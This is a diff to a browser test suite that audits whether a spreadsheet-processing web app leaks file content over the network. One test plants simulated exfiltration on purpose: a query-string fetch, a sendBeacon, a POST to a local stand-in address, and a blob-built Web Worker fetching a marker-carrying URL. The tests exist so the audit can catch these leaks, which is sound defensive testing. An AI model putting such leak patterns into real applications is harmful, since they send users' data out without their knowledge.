@@ -41,7 +41,8 @@ test('a run of an xlsx file loads only static assets and sends no file content',
   // The markers did go through the engine: they are in the output file.
   const text = await outputText(ran.files[0]!.bytes);
   for (const m of MARKERS) expect(text).toContain(JSON.stringify(m).slice(1, -1));
-  expect(requests.length).toBeGreaterThan(0);
+  // The engine worker loads its wasm file while the run starts. If the log lacks it, the log does not see worker requests.
+  expect(requests.some((r) => /\/assets\/duckdb-[^/]*\.wasm$/.test(r.url))).toBe(true);
   expect(auditRequests(requests, ORIGIN, MARKERS)).toEqual([]);
 });
 
@@ -67,6 +68,15 @@ test('the audit fails when a page leaks: a query, a beacon and another address a
     await fetch(`/leak?d=${encodeURIComponent(marker)}`).catch(() => undefined);
     navigator.sendBeacon('/beacon', marker);
     await fetch('http://127.0.0.1:9/collect', { method: 'POST', body: marker, mode: 'no-cors' }).catch(() => undefined);
+    // The same kind of leak from a Web Worker, where the engine runs. The address is absolute: a blob: base cannot resolve a path.
+    const leakUrl = `${location.origin}/leak-from-worker?d=${encodeURIComponent(marker)}`;
+    const code = 'self.onmessage = async (e) => { try { await fetch(e.data); } catch { /* the request is what counts */ } self.postMessage("done"); };';
+    const worker = new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })));
+    await new Promise((resolve) => {
+      worker.onmessage = resolve;
+      worker.postMessage(leakUrl);
+    });
+    worker.terminate();
   }, MARKERS[0]!);
   await page.waitForTimeout(300);
 
@@ -75,6 +85,9 @@ test('the audit fails when a page leaks: a query, a beacon and another address a
   expect(violations.some((v) => /not a static asset/.test(v))).toBe(true);
   expect(violations.some((v) => /another address/.test(v))).toBe(true);
   expect(violations.some((v) => /POST/.test(v))).toBe(true);
+  // The listener sees the requests of a Web Worker too, and the audit finds the one that carries the marker.
+  expect(requests.some((r) => r.url.includes('/leak-from-worker'))).toBe(true);
+  expect(violations.some((v) => v.includes('/leak-from-worker') && /carries file content/.test(v))).toBe(true);
   // The findings come from the leaks: the requests before them were clean.
   expect(requests.length).toBeGreaterThan(beforeLeaks);
   expect(auditRequests(requests.slice(0, beforeLeaks), ORIGIN, MARKERS)).toEqual([]);
